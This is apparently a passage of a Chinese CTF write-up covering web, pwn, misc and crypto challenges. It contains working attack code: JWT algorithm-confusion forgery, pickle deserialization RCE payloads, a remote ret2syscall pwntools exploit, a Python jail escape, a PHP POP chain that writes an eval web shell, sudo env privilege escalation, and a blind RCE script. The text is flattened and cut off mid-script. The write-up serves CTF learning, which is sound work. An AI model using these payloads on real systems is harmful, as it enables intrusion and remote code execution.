eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhYSIsInBhc3N3b3JkIjoiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCJpc19hZG1pbiI6ZmFsc2V9.esPiIzL35oWvFOGJeibCt7otZWE-83pVzGuljOE4O19amvZ2Y8zwgW71M-_CSVh_Wdiaz8RJaBKs-w_WCFSoEhEr7bToIDH5zeY38d8H4gkBpNGLhFWvhoRF5a-T0VrHS7JeTSJdyVgqpS7vF5o8pT3Q_fC13Hv4I-lMCYfeNhCe-SQnm9c86wVwF7i0KLY0vvi4CI9zx-iZWSzNHFmSpnXmQms8Tg9KoKO7Qq6SpccPbL4eJ5o52lSAjtohSeubVJcC_suXlNuB-odexWVozcuTRcAC-9uGUAWl7qZHc3TZffFOotggGONL5qSqpQJR5ST8KbCJkqk2hGnBpg9GSw eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImNjYyIsInBhc3N3b3JkIjoiNzc5NjNiN2E5MzEzNzdhZDRhYjVhZDZhOWNkNzE4YWEiLCJpc19hZG1pbiI6ZmFsc2V9.mJJbTtmHn_4dUKpaTEdETBdpFuTF7AggxptHdDuIPnD2FaIA1gX2Ys9PB5R4vLzi8MUTLB4Wufuoh2UCQnSzX0lVUx347ujgHUO_xrvPwkUAiZjoM4j5W7csJWMsSL-9T3AmHpRjJbHnXvmVzt_xQvOSBU1KUgkw2tyuwxPqjPJjkpKXIaialQmRL2ML3t2SdWiyPvPy9yo4BXQFRpFRLAA82C7OZN43wuoSSUVBvwnh6XnQXAoVugLxnFF7qFrxLDeb0b37K3_-ynMiU4FvLArGvgaWkQqvM2PdOEVpynvsM5SRGsrxvgJqo19aaSwjnttksRbfKLOJcKUFW3XwLg[*] GCD: 0x4[*] GCD: 0x2cdf3da1c5b0e166e522b8eee9feb75e98fe6a9e9bc0092cd81e32916cfee418321e21801d4b385b9361600765d21dde3e02a1a42734ebccad3194ed323cc09a4a78cccab401bb6139b3537871c649d8a0da4358e1f9e565ec5fcdd42c3660000755f53ff91a59dd7eb6ee9895cfcfd058826ac70353fe8fb55e65b62fa929bc3ea29998aff334a3c217053ab04120272b582e6692bb88bd23a3478e4462be43f8c39b3256e0d64399e51f0f0ea69c9726a6c91dae89e1b7c58f2655dcb291cccc862b13565dd5b844d3494a92e614fa90f07a66f8f10e19090bc76c6c954e82bc47afafd3df8384dcfd2d1fbfa8266923ea8b48c6b8f112df6d8e67420e076a4[+] Found n with multiplier 1 : 0x2cdf3da1c5b0e166e522b8eee9feb75e98fe6a9e9bc0092cd81e32916cfee418321e21801d4b385b9361600765d21dde3e02a1a42734ebccad3194ed323cc09a4a78cccab401bb6139b3537871c649d8a0da4358e1f9e565ec5fcdd42c3660000755f53ff91a59dd7eb6ee9895cfcfd058826ac70353fe8fb55e65b62fa929bc3ea29998aff334a3c217053ab04120272b582e6692bb88bd23a3478e4462be43f8c39b3256e0d64399e51f0f0ea69c9726a6c91dae89e1b7c58f2655dcb291cccc862b13565dd5b844d3494a92e614fa90f07a66f8f10e19090bc76c6c954e82bc47afafd3df8384dcfd2d1fbfa8266923ea8b48c6b8f112df6d8e67420e076a4[+] Written to 2cdf3da1c5b0e166_65537_x509.pem[+] Tampered JWT: b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.Ay8GNWt_1llpI5Q8qPOt-wIs7c8AjxQZ85nc97Y0b8Y&#x27;[+] Written to 2cdf3da1c5b0e166_65537_pkcs1.pem[+] Tampered JWT: b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.4lUi6OL8NIqdBeJ9y0s4BkV9-5twlf973KXfVuB0bXg&#x27;[+] Found n with multiplier 2 : 0x166f9ed0e2d870b372915c7774ff5baf4c7f354f4de004966c0f1948b67f720c190f10c00ea59c2dc9b0b003b2e90eef1f0150d2139a75e65698ca76991e604d253c66655a00ddb09cd9a9bc38e324ec506d21ac70fcf2b2f62fe6ea161b300003aafa9ffc8d2ceebf5b774c4ae7e7e82c41356381a9ff47daaf32db17d494de1f514ccc57f99a51e10b829d5820901395ac1733495dc45e91d1a3c722315f21fc61cd992b706b21ccf28f8787534e4b9353648ed744f0dbe2c7932aee5948e666431589ab2eeadc2269a4a549730a7d48783d337c78870c8485e3b6364aa7415e23d7d7e9efc1c26e7e968fdfd4133491f545a4635c78896fb6c733a10703b52[+] Written to 166f9ed0e2d870b3_65537_x509.pem[+] Tampered JWT: b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.aApemXL-HmcakktrnGr1XaUpkfaMOp4oL919wO3MJy0&#x27;[+] Written to 166f9ed0e2d870b3_65537_pkcs1.pem[+] Tampered JWT: b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.vJ1JdCFGV3vRkM1H3IF8wlFKaWVXcQbrHix3gHqvZMo&#x27;[+] Found n with multiplier 4 : 0xb37cf68716c3859b948ae3bba7fadd7a63f9aa7a6f0024b36078ca45b3fb9060c8788600752ce16e4d85801d97487778f80a86909cd3af32b4c653b4c8f3026929e3332ad006ed84e6cd4de1c719276283690d6387e79597b17f3750b0d980001d57d4ffe4696775fadbba62573f3f416209ab1c0d4ffa3ed57996d8bea4a6f0fa8a6662bfccd28f085c14eac104809cad60b99a4aee22f48e8d1e39118af90fe30e6cc95b83590e67947c3c3a9a725c9a9b2476ba2786df163c995772ca47333218ac4d597756e1134d252a4b9853ea43c1e99be3c43864242f1db1b2553a0af11ebebf4f7e0e1373f4b47efea099a48faa2d231ae3c44b7db6399d08381da9[+] Written to b37cf68716c3859b_65537_x509.pem[+] Tampered JWT: b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.exHt20EJDDnCPtoF5H1WI80i5o7HmntbrISr9-wuZg4&#x27;[+] Written to b37cf68716c3859b_65537_pkcs1.pem[+] Tampered JWT: b&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.QejW2HaJAbmCgXQHkJxutQdYaSaFSeRnhKA3LKSyahY&#x27;================================================================================Here are your JWT&#x27;s once again for your copypasting pleasure================================================================================eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.Ay8GNWt_1llpI5Q8qPOt-wIs7c8AjxQZ85nc97Y0b8YeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.4lUi6OL8NIqdBeJ9y0s4BkV9-5twlf973KXfVuB0bXgeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.aApemXL-HmcakktrnGr1XaUpkfaMOp4oL919wO3MJy0eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.vJ1JdCFGV3vRkM1H3IF8wlFKaWVXcQbrHix3gHqvZMoeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.exHt20EJDDnCPtoF5H1WI80i5o7HmntbrISr9-wuZg4eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.QejW2HaJAbmCgXQHkJxutQdYaSaFSeRnhKA3LKSyahY 利用 /admin 回显尝试出公钥是 b37cf68716c3859b_65537_pkcs1.pem。 /admin 路由可通过HS256解析，尝试修改RS256为HS256，先生成pickle： 123456789import pickleimport base64class A(object): def __reduce__(self): return (eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;sleep 5&#x27;)&quot;,))poc = A()result = pickle.dumps(poc)result = base64.b64encode(result)print(result) 再生成HS256的jwt： 12345678910111213// 1.jsconst jwt = require(&#x27;jsonwebtoken&#x27;);const fs = require(&#x27;fs&#x27;);var cert = fs.readFileSync(process.cwd()+&#x27;\\\\b37cf68716c3859b_65537_pkcs1.pem&#x27;);// console.log(privateKey);var token = jwt.sign(&#123;username: &quot;aaa&quot;,password: &quot;08f8e0260c64418510cefb2b06eee5cd&quot;,is_admin: true,introduction: &quot;gASVPgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NsZWVwIDUnKZSFlFKULg==&quot;&#125;, cert, &#123; algorithm: &#x27;HS256&#x27; &#125;);console.log(token)// **************************// // node 1.js// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSIsInBhc3N3b3JkIjoiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCJpc19hZG1pbiI6dHJ1ZSwiaW50cm9kdWN0aW9uIjoiZ0FTVlBnQUFBQUFBQUFDTUNHSjFhV3gwYVc1emxJd0VaWFpoYkpTVGxJd2lYMTlwYlhCdmNuUmZYeWduYjNNbktTNXplWE4wWlcwb0ozTnNaV1Z3SURVbktaU0ZsRktVTGc9PSIsImlhdCI6MTczMDYwNDAzMH0.ro7Xyjbw5uyYmIh1TRYDpiWHKoYDtV-fEQ9yhIumzz0 修改cookie，尝试成功触发sleep，改pickle为反弹shell代码，成功反弹shell，cat /flag 得到flag。 ​ Reverse/PwnWhoIsAdmin 尝试对AcountSystem进行攻击，获取shell，拿到flag。你需要想办法让admin_login_state登录状态为1，并买下该系统，才能改系统名称哦。前置知识：Crypto：AES-CBC翻转攻击，Pwn：整数溢出、64位ret2syscall 分析菜单的主要功能如下： 1-新建普通用户，用户名=BinaryCryptoYYDS，AES加密，得到密文3-显示 money4-输入 x 计算RSA，成功后，输入 y，money+=(-100)*y，LimitAcountNumber+=y5-显示 LimitAcountNumber6-如果 money&gt;50000，买下系统，则 buy=17-输入密文，AES解密得到 用户名=AdminAdminAdminA，则 admin_login_state=18-满足用户是 admin（admin_login_state == 1）且买下系统（buy == 1）后，可以修改系统名字 攻击思路 先买系统，输入4，计算 x： 12345678910n = 281443p = 431q = 653e = 17c = 222876f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(m)# 1640 然后整数溢出，使 money&gt;50000，输入6，买下系统，buy=1。 下一步伪造管理员登录，输出7，cbc字节翻转攻击，满足用户名=AdminAdminAdminA，admin_login_state=1。 最后改系统名字，输入8，scanf 栈溢出，ret2syscall。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)r=remote(&#x27;nc1.ctfplus.cn&#x27;,24011)# buy = 1r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;4&#x27;)r.sendlineafter(b&#x27;satisfied???\\n&#x27;,b&#x27;1640&#x27;)r.sendlineafter(b&#x27;add?\\n&#x27;,b&#x27;-500&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;6&#x27;)# admin_login_state = 1r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;1&#x27;)m0 = &#x27;BinaryCryptoYYDS&#x27;m1 = &#x27;AdminAdminAdminA&#x27;r.recvuntil(b&#x27;authcode: &#x27;)c0 = r.recvline().strip().decode()print(c0)c = list(bytes.fromhex(c0[:32]))for i in range(16): c[i] ^= (ord(m0[i])^ord(m1[i]))new_c = bytes(c).hex()+c0[32:]print(new_c)r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;7&#x27;)r.sendlineafter(b&#x27;authcode: \\n&#x27;,new_c.encode())# change namepop_rax=0x40153cpop_rdi=0x402db3pop_rsi_r15=0x402db1pop_rdx=0x401538ret=0x40101asyscall=0x401527AccountSystemName_addr=0x4052F0r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;8&#x27;)r.recvuntil(b&#x27;name: &#x27;)pl=flat([ b&#x27;/bin/sh\\x00&#x27;.ljust(0x20+8,b&#x27;\\x00&#x27;), pop_rax,59, pop_rdi,AccountSystemName_addr, pop_rsi_r15,0,0, pop_rdx,0, syscall ])r.sendline(pl)r.interactive()# flag&#123;PwnAndCryptoAreBothVeryInteresting&#125; ​ Week4Mischard_jail waf好短，看起来好简单OUO 交互拿到源码： 12345678910111213141516171819202122black=[&quot;(&quot;,&quot;)&quot;,&quot;\\&#x27;&quot;,&quot;\\&quot;&quot;,&quot;@&quot;]banner=&#x27;&#x27;&#x27; _ _ _ _ _| |__ __ _ _ __ __| | (_) __ _(_) || &#x27;_ \\ / _` | &#x27;__/ _` | | |/ _` | | || | | | (_| | | | (_| | | | (_| | | ||_| |_|\\__,_|_| \\__,_|____ _/ |\\__,_|_|_| |_____|__/&#x27;&#x27;&#x27;print(banner)print(&quot;input your code or input &#x27;show&#x27; to get the source code&quot;)while True: code = input(&quot;&gt;&gt;&quot;) if code==&quot;show&quot;: print(open(__file__,&quot;r&quot;).read()) continue if not code.isascii(): exit(&quot;Please input ascii&quot;) if len(code)&gt;50: exit(&quot;code too long&quot;) for word in black: if word in code: exit(&quot;hacker!!!!&quot;) exec(code) 覆盖black为空即可： 123&gt;&gt;black=[]&gt;&gt;print(__import__(&quot;os&quot;).popen(&quot;ls /home/*&quot;).read())&gt;&gt;print(__import__(&quot;os&quot;).popen(&quot;nl /h*/*/*&quot;).read()) ​ Secret of Starven 有黑客进入了Starven的电脑，还偷走了他的学习资料，你能帮助他挽回尊严嘛 SMB流量，用 smb2 筛选，在405提取 secret.zip 数据，zip爆破，密码：spellorstarve。 解压得到flag：SYC&#123;D0n7_spre0d_St@rven&#39;s_s3crEt&#125;。 ​ Cryptoeasy_LLL 升级svp,flag前缀为SYC{xx} HNP问题，$a_im+b_i \\equiv c_i \\pmod p \\Rightarrow -b_i=a_im-c_i+k_ip$，构造格，LLL求解。 12345678910111213141516171819202122232425262728p = 114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571c = [25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980, 75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974, 4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536, 16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193, 106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500]a = [177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539, 154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561, 162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877, 156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623, 94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201]t = 5A = a[:]B = [-k for k in c]# Construct LatticeK = 2^400 # ki &lt; 2^400X = p * identity_matrix(QQ, t) # t * tZ = matrix(QQ, [0] * t + [K/p] + [0]).transpose() # t+1 columnZ2 = matrix(QQ, [0] * (t+1) + [K]).transpose() # t+2 columnY = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) # (t+2) * tY = block_matrix([[Y, Z, Z2]])# Find short vectorY = Y.LLL()# checkk0 = ZZ(Y[1, 0] % p)x = ZZ(Y[1, -2] / (K/p) % p)assert(k0 == (A[0]*x + B[0]) % p)print(x)print(bytes.fromhex(hex(x)[2:]))# b&#x27;SYC&#123;125b-5c7b19c7-90e2-8d87c8a8&#125;&#x27; ​ highlow 高，低位，异或，flag前缀为SYC{xx} flag为44位，高1024-44*8-400=272为0，低400位为0，coppersmith求解。 1234567891011121314151617181920212223from Crypto.Util.number import *from tqdm import *c = 11017336122691034053241992293963114590816319844384287448629663672049205892828600396465505710922907685545939978376321927394655458727494361852952898280905220963163625482295222856129164172619564344634365520328815972232825639292605311741655988427166811406091329613627961070231457035303298793651546412496975662225857123805867756651901374507447803198638466304862480202099076813471571495380132563252630789218173007275890600746758285415274434393381125742526014986039652677605642226576741424053749512280825231217420239089105794080707322357602941046822659335487420672699022969372037662958497832065752272061853723653365171768556n = 14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579pxor = 124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951e = 65537# 1024-44*8-400=272ph = pxor &gt;&gt; (44*8+400) &lt;&lt; (44*8+400)pl = pxor % (2^400)P.&lt;x&gt; = PolynomialRing(Zmod(n))f = ph + x * 2^400 + plroot = f.monic().small_roots(X=2^(44*8), beta=0.48)p = ph + int(root[0]) * 2^400 + plq = n // pf = (p-1)*(q-1)d = inverse(e,f)m = pow(c,d,n)print(long_to_bytes(int(m)))# b&#x27;SYC&#123;2f521b13bc9d6e932e9f5cbe511112df9e3a9c6&#125;&#x27; ​ Number theory 费马，flag前缀为SYC{xx} $h_0 \\equiv (1012q + 2024)^p \\pmod n \\\\\\Rightarrow h_0 \\equiv (1012q + 2024)^p \\pmod q \\\\\\Rightarrow h_0 \\equiv 2024^p \\pmod q \\\\\\Rightarrow 2024^p = h_0-kq \\\\\\Rightarrow 2024^n = (h_0-kq)^q \\\\\\Rightarrow 2024^n=h_0^q + Kq \\\\\\Rightarrow 2024^n \\equiv h_0 \\pmod q$ 所以 $2024^n-h_0$，必然是 $q$ 的倍数。 $h_1=a_1p+b_1q,h_2=a_2p+b_2q \\\\\\Rightarrow b_2h_1=a_1b_2p+b_1b_2q,b_1h_2=a_2b_1p+b_1b_2q$ 相减有 $b_2h_1-b_1h_2=(a_1b_2-a_2b_1)*p$，爆破小位数的 $b_1,b_2$ 求gcd得 $p$。 12345678910111213141516171819202122232425from Crypto.Util.number import *h0 = 3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440n1 = 20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561h1 = 49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888h2 = 56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634n2 = 21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057c = 5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838e = 65537q = GCD(n1, pow(2024,n1,n1)-h0)primelist = [i for i in range(2**12,2**13) if isPrime(i)]print(len(primelist))for a in primelist: for b in primelist: g = GCD(n2, abs(b*h1-a*h2)) if g != 1: p = gd = inverse(e,(p-1)*(q-1))m = pow(c,d,p*q)print(long_to_bytes(m))# b&#x27;SYC&#123;492aebb6-9c16-4b1a-ac42-fc608bf6063f&#125;&#x27; ​ Webnot_just_pop 听Bingfeng师傅说他的ez_pop很难，要不试试这个更简单的? pop链构造，传给Syclover参数。 123456789101112131415161718192021222324252627from phpserialize import *import base64class lhRaMK7: public_love=&#x27;phpinfo();&#x27;class Starven: public_friend=lhRaMK7()class SYC: public_forever=Starven()class Parar: private_execurise=&#x27;man!&#x27; public_hansome=SYC()class Starven: public_girl=Parar()class lhRaMK7: public_Do=Starven() public_You=SYC()s = serialize(lhRaMK7())print(base64.b64encode(s[:-1].encode()))# Tzo3OiJsaFJhTUs3IjoyOntzOjI6IkRvIjtPOjc6IlN0YXJ2ZW4iOjE6e3M6NDoiZ2lybCI7Tzo1OiJQYXJhciI6Mjp7czoxNjoiAFBhcmFyAGV4ZWN1cmlzZSI7czo0OiJtYW4hIjtzOjc6ImhhbnNvbWUiO086MzoiU1lDIjoxOntzOjc6ImZvcmV2ZXIiO086NzoiU3RhcnZlbiI6MTp7czo2OiJmcmllbmQiO086NzoibGhSYU1LNyI6MTp7czo0OiJsb3ZlIjtzOjEzOiJzeXN0ZW0oImlkIik7Ijt9fX19fXM6MzoiWW91IjtPOjM6IlNZQyI6MTp7czo3OiJmb3JldmVyIjtyOjU7fQ== 发现存在 disable_function，无法读/flag： 1exec,system,shell_exec,popens,popen,curl_exec,curl_multi_exec,proc_open,proc_get_status,,readfile,unlink,dl,memory_get_usage,dl,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,linkopen_basedir 更换命令为 file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);&quot;); 写马，蚁剑连接，使用绕过 disable_function 插件，测试使用PHP7_Backtrace_UAF可以成功执行命令。 sudo -l 发现：NOPASSWD: /usr/bin/env env -C ：在指定目录下执行指定命令，并设置相应的环境变量。例如，输入”env -C /usr/bin ls”命令会在/usr/bin目录下执行ls命令。 提权读/flag：sudo /usr/bin/env -C cat /flag ​ ez_python 五个月前，道心破碎，于是便出了这道题，你能治愈当时的我破碎的心灵吗？我会给你flag作为奖励…… 注册，登录，提示：Error!!!! give you hint: maybe you can view /starven_s3cret。 访问 /starven_s3cret 下载源码，代码审计，在 /login 路由下，statement传入内容，再触发pickle反序列化。 构造： 12345678import base64payload = b&#x27;&#x27;&#x27;(cossystemS&#x27;sleep 3&#x27;o.&#x27;&#x27;&#x27;print(base64.b64encode(payload)) 发现可以过黑名单，且成功触发sleep。 尝试反弹shell不成功，配合RCE盲注拿flag： 12345678910111213141516171819202122232425262728import requestsimport base64chars = [&#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, 